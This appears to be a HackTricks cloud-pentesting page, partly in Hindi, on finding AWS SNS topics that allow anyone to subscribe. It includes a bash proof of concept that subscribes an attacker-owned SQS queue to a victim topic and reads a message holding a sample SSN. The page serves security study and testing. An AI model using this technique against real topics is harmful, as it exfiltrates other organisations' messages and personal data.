# AWS - SNS Unauthenticated Enum

{{#include ../../../../banners/hacktricks-training.md}}

## SNS

SNS के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-sns-enum.md
{{#endref}}

### सभी के लिए खुला

जब आप वेब कंसोल से एक SNS topic कॉन्फ़िगर करते हैं तो आप यह संकेत कर सकते हैं कि **Everyone can publish and subscribe** to the topic:

<figure><img src="../../../../images/image (212).png" alt=""><figcaption></figcaption></figure>

तो अगर आप अकाउंट के अंदर **find the ARN of topics** (या संभावित नामों के लिए brute forcing करके) आप यह **check** कर सकते हैं कि आप उन्हें **publish** या **subscribe** कर सकते हैं।

यह एक SNS topic resource policy के समकक्ष होगा जो `sns:Subscribe` को `*` (या बाहरी accounts को) की अनुमति देता है; कोई भी principal एक subscription बना सकता है जो सभी भविष्य के topic messages को उनके मालिकाना SQS queue में भेजता है। जब queue का owner subscription शुरू करता है, तो SQS endpoints के लिए किसी मानवीय पुष्टि की आवश्यकता नहीं होती।

<details>
<summary>Repro (us-east-1)</summary>
```bash
REGION=us-east-1
# Victim account (topic owner)
VICTIM_TOPIC_ARN=$(aws sns create-topic --name exfil-victim-topic-$(date +%s) --region $REGION --query TopicArn --output text)

# Open the topic to anyone subscribing
cat > /tmp/topic-policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"OpenSubscribe","Effect":"Allow","Principal":"*","Action":"sns:Subscribe","Resource":"$VICTIM_TOPIC_ARN"}]}
JSON
aws sns set-topic-attributes --region $REGION --topic-arn "$VICTIM_TOPIC_ARN" --attribute-name Policy --attribute-value file:///tmp/topic-policy.json

# Attacker account (queue owner)
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name attacker-exfil-queue-$(date +%s) --region $REGION --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --region $REGION --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Allow the victim topic to send to the attacker queue
cat > /tmp/sqs-policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AllowVictimTopicSend","Effect":"Allow","Principal":{"Service":"sns.amazonaws.com"},"Action":"sqs:SendMessage","Resource":"$ATTACKER_Q_ARN","Condition":{"ArnEquals":{"aws:SourceArn":"$VICTIM_TOPIC_ARN"}}}]}
JSON
aws sqs set-queue-attributes --queue-url "$ATTACKER_Q_URL" --region $REGION --attributes Policy="$(cat /tmp/sqs-policy.json)"

# Subscribe the attacker queue to the victim topic (auto-confirmed for SQS)
SUB_ARN=$(aws sns subscribe --region $REGION --topic-arn "$VICTIM_TOPIC_ARN" --protocol sqs --notification-endpoint "$ATTACKER_Q_ARN" --query SubscriptionArn --output text)

# Validation: publish and receive
aws sns publish --region $REGION --topic-arn "$VICTIM_TOPIC_ARN" --message {pii:ssn:123-45-6789}
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" --region $REGION --max-number-of-messages 1 --wait-time-seconds 10 --query Messages[0].Body --output text
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
